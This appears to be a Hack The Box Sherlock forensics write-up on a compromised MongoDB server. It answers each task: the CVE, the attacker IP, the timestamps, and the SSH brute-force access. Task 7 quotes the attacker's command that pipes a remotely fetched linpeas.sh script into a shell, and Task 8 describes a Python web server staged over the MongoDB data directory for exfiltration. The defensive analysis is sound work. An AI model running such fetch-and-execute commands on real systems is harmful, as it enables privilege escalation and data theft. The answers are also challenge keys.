# MangoBleed
![mangobleed.png](/MangoBleedHTB/screenshots/mangobleed.png)

# Sherlock Scenario
> You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.
> You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.

# Task 1: What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?

Google

Ans: `CVE-2025-14847`

# Task 2: What is the version of MongoDB installed on the server that the CVE exploited?

After extracting the provided artifacts, the MongoDB logs were examined by navigating to `\[root]\var\log\mongodb` and opening the `mongod.log` file.

![mongover.png](/MangoBleedHTB/screenshots/mongover.png)

Ans: `8.0.16`

# Task 3: Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.

Upon a preliminary review of the mongod.log file, a suspicious IP address was identified in the logs.

![mongoattip.png](/MangoBleedHTB/screenshots/mongoattip.png)

Ans: `65.0.76.43`

# Task 4: Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)

A manual review of the log entries was conducted to identify the first occurrence of the suspicious IP address. The following event was identified:

![date.png](/MangoBleedHTB/screenshots/date.png)

Ans: `2025-12-29 05:25:52`

# Task 5: Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.

By reviewing the end of the logs, we identified a total of 37,630 connections initiated by the attacker. Since each connection generates both a connection and a disconnection event, the total number of related log entries is calculated by multiplying this value by two, resulting in 75,260 events.

![conn.png](/MangoBleedHTB/screenshots/conn.png)

Ans: `75260`

# Task 6: The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?

Reviewing the `auth.log` file located under `/var/log/`, we identified the following events:

![brutefdate.png](/MangoBleedHTB/screenshots/brutefdate.png)

Ans: `2025-12-29 05:40:03`

# Task 7: Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.

Reviewing the `.bash_history` file of the `mongoadmin` user, located under `/home/mongoadmin`, we identified the following commands executed by the attacker:

![bashhist.png](/MangoBleedHTB/screenshots/bashhist.png)

Ans: `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`

# Task 8: The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?

Based on the previous screenshot, the attacker appeared to be interested in the `/var/lib/mongodb` directory and attempted to start a Python HTTP server from this location, likely to facilitate the exfiltration of its contents.

Ans: `/var/lib/mongodb`

